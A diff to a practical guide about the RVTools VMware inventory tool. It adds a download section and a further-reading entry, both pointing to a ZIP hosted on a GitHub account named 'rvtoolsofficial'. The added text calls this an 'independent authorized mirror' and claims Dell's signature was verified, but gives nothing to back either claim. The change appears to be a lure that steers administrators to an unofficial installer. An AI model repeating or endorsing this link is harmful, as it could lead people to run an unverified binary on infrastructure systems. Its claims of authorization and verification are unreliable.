@@ -7,6 +7,12 @@
 ![Version](https://img.shields.io/badge/RVTools-4.8.2-16A34A)
 ![Format](https://img.shields.io/badge/guide-practical-7C3AED)
 
+## Download RVTools 4.8.2
+
+[⬇️ Download the ZIP](https://github.com/rvtoolsofficial/rvtools-4-8-2-download/releases/download/v4.8.2/RVTools-4.8.2.zip) · [Release details, source, and checksums](https://github.com/rvtoolsofficial/rvtools-4-8-2-download)
+
+The ZIP contains the RVTools 4.8.2 MSI obtained from Dell's distribution URL. The installer's Authenticode signature was verified as valid and signed by Dell Technologies Inc. This is an independent authorized mirror, not an official Dell support channel. Review the applicable license and distribution terms before use.
+
 ## What is RVTools?
 
 RVTools is a lightweight Windows application for VMware administrators. It collects and presents information about virtual infrastructure—including virtual machines, hosts, clusters, and datastores—in a format that is easier to review and export.
@@ -54,6 +60,7 @@ RVTools can make VMware inventory easier to collect, review, and use as an input
 
 ## Further reading
 
+- [Download RVTools 4.8.2 (ZIP) — source and checksums](https://github.com/rvtoolsofficial/rvtools-4-8-2-download)
 - [Dell: RVTools overview and Collector information](https://www.dell.com/en-us/shop/vmware/sl/rvtools)
 - [Microsoft Learn: Discover VMware servers with Azure Migrate](https://learn.microsoft.com/en-us/azure/migrate/tutorial-discover-vmware)
 
